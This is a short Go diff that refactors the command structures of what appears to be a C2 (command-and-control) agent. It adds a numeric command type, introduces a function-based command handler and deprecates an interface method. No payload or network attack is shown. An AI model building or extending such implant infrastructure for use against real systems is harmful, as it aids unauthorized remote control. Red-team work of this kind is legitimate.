@@ -11,7 +11,8 @@ import (
 
 // Command represents a single command from the C2 server
 type Command struct {
-	Command          string `json:"command"`
+	CommandType      int    `json:"command_type"`       // Numeric command ID for dispatch
+	Command          string `json:"command"`            // Full command string with args
 	CommandID        string `json:"command_id"`
 	CommandDBID      int    `json:"command_db_id"`
 	AgentID          string `json:"agent_id"`
@@ -66,10 +67,14 @@ type CommandContext struct {
 	MakeToken      interface{}       // Keep for backward compatibility
 }
 
-// CommandInterface defines the interface that all commands must implement
+// CommandHandler is the function signature for command execution.
+// All commands are now plain functions instead of struct methods.
+type CommandHandler func(ctx *CommandContext, args []string) CommandResult
+
+// CommandInterface is deprecated - kept for backward compatibility during migration.
+// New commands should use CommandHandler functions instead.
 type CommandInterface interface {
 	Execute(ctx *CommandContext, args []string) CommandResult
-	Name() string
 }
 
 // JobInfo represents information about an active job
